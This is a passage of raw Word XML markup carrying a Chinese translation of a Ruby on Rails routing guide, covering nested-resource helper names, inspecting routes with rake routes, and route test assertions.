      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 增加上一个 额外的规则就可以了。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="73E2E695" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1977014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ActiveSupport::Inflector.inflections do</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>|inflect|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05785EEE"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inflect.irregular 'tooth', 'teeth'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="75DE800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62B4D22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h4 在内嵌 Resource 中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DEEC48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在内嵌的 Resource 中使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 参数将会覆盖掉自动生成部分的 Helper 名。例如：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5376"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="70264D45" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5BF78A19"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resources :magazines</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4279CD5B"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  resources :ads, :as</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; 'periodical_ads'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55C7E197"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end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="086F5418"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这将会建立像 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>magazine_periodical_ads_url</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>edit_magazine_periodical_ad_path</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 这样的 Helper。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F9D24B" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>5 对路由进行检查和测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58055C37"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Rails 提供了检查和测试路由的工具。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60AF8312"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 xml:space="preserve">5.1 通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 查看存在的路由规则</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48442241"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如果你想要一整套应用的完整可用的路由规则列表，运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake routes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令就好。他将会根据你在 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>routes.rb</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件中的顺序打印出你所有的路由。对于每一个路由你都可以看到：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78E2F3D9" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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路由的名字（如果有的话）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B1BCAD" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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所使用的 HTTP 动词（除非这个路由规则不相应任何动词）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EA00199" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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将会匹配的 URL 模式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B6A5918" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="97"/>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匹配到路由的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E8DA25"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例如，这里是一个 RESTful 路由的 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake routes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 命令输出的片段</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15056A8D" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">    users GET    /users(.:format)          users#index</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BD5640A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">          POST   /users(.:format)          users#create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="146B8BAF" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> new_user GET    /users/new(.:format)      users#new</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CDA66F4" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53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6E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>edit_user GET    /users/:id/edit(.:format) users#edit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AC893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你可以设定环境变量 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>CONTROLLER</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来限定只输出匹配到特定控制器的路由规则。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3816"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="3552F1CF" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3317DBAB" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="237135549"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>$ CONTROLLER=users rake routes</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A135F0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如果你把终端窗口放大一点让 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rake routes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 能够完整输出每一行可能你能看的舒服不少.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643063CE" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="3"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>5.2 路由测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F71C9C0"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你的测试中应该加入路由测试（就和你应用程序的其他部分一样）。Rails 提供三个 </w:t>
      </w:r>
      <w:hyperlink r:id="rId398" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>内建的断言</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 被设计来帮助你进行路由的测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B55A484" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>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assert_generates</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9526A8" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>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assert_recognizes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F8D88A" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="98"/>
        </w:numPr>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assert_routing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20981A59" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">5.2.1 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assert_generates</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> 断言</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="063797AF"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assert_generates</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 能够对是否生成指定的路径进行断言：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="587DEA12" w14:textId="77777777" w:rsidTr="00DF3BF6">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1DC2D5C4"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assert_generates "/photos/1", { :controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "photos", :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "show", :id</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "1"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="568F74BA"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assert_generates "/about", :controller</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "pages", :action</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>=&gt; "about"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7189A0F5" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="4"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">5.2.2 </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>assert_recognizes</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
